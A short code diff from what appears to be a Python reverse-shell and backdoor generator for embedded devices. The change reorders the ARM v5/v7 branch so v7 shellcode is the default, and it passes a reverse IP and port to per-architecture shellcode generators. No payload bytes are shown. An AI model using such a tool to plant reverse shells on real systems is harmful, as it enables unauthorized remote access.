@@ -50,15 +50,15 @@ if __name__=="__main__":
 		if context.arch=="mips" and context.endian=="big":
 			generate_mips.generate_mips_shellcode(reverse_ip,reverse_port)
 		if context.arch=="arm"  and context.endian=='little':
-			if args.arch_version!="v7":
-				generate_arm.generate_armelv5_shellcode(reverse_ip,reverse_port)
-			else:
+			if args.arch_version!="v5":
 				generate_arm.generate_armelv7_shellcode(reverse_ip,reverse_port)
-		if context.arch=="arm" and context.endian=="big":
-			if args.arch_version!="v7":
-				generate_arm.generate_armebv5_shellcode(reverse_ip,reverse_port)
 			else:
+				generate_arm.generate_armelv5_shellcode(reverse_ip,reverse_port)
+		if context.arch=="arm" and context.endian=="big":
+			if args.arch_version!="v5":
 				generate_arm.generate_armebv7_shellcode(reverse_ip,reverse_port)
+			else:
+				generate_arm.generate_armebv5_shellcode(reverse_ip,reverse_port)
 		if context.arch=="aarch64" and context.endian=="little":
 			generate_aarch64.generate_aarch64_shellcode(reverse_ip,reverse_port)
 	if args.exploit_shellcode==None and args.backdoor_file!=None:
